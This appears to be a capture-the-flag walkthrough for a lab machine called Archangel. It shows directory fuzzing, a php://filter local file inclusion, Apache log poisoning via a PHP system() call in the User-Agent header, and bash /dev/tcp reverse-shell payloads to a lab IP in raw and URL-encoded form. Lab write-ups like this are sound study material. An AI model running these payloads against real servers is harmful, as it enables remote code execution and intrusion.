## Archangel

#### Scan
```
nmap/*
```

#### Task2
- Find a different hostname
 - Send us a mail -> support@`mafialive.thm`

- Find flag 1
  - Walk-throught
  	```
  	# sudo vi /etc/hosts
  	EXPORT_IP	mafialive.thm
 	```
 - Look for a page under development
	 ```
	 ffuf -w {WORD_LIST} -u http://mafialive.thm/FUZZ
	 ```
 	- test.php

 - Find flag 2
   - phpfilter bypass
	   ```
	   http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
	   ```
	   - echo "{OUTPUT_TEXT}" | base64 -d
	   - Get Second Flag
 - Get a shell and find the user flag
   - Burp Repeater inject
	```
   	GET /test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=id HTTP/1.1
	User-Agent: Mozilla/5.0 <?php system($_GET['cmd'])?> Gecko/20100101 Firefox/78.0
    ```
    - Reverse shell payload
    ```
    /test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=bash -c ‘exec bash -i &>/dev/tcp/10.9.26.67/1234 <&1’
    ```
    - Reverse Shell payload (URL Encoded)
    ```
    /test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=bash+-c+"exec+bash+-i+%26>/dev/tcp/10.9.26.67/1234+<%261" 
    ```